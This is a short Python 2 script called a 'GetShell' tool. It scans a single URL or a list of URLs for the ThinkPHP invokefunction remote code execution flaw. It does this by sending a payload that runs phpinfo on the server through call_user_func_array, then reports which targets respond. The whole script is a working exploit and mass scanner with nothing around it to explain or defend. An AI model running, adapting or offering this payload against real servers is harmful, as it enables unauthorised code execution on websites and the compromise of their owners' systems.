#!/usr/bin/env python
# -*- coding: utf-8 -*- 
# GetShell Tools author: Bearcat

import sys
import requests

def send_payload(target):
	payload = [r"/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"]
	targets = target + payload[0]
	header_list = {
		'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0',
	}

	try:
		request = requests.get(target)
		if request.status_code == 404:
			print "[-] 404 not found " + target
		else:
			results = requests.get(targets,headers=header_list,timeout=3).text
			r = requests.get(targets,verify=False,timeout=6).text
			if 'PHP Version' in r:
				print "[+] exists " + target
			else:
				print "[-] don't exists " + target
	except requests.ConnectionError:
		print "[-] Cannot connect url " + target

def read_url_list(files):
	for line in open(files):
		send_payload(line[:-1])

if __name__ == '__main__':
	print "\n[*] Start Check...\n"
	if sys.argv[1] == "-u":
		send_payload(sys.argv[2])
	elif sys.argv[1] == "-f":
		file = sys.argv[2]
		read_url_list(file)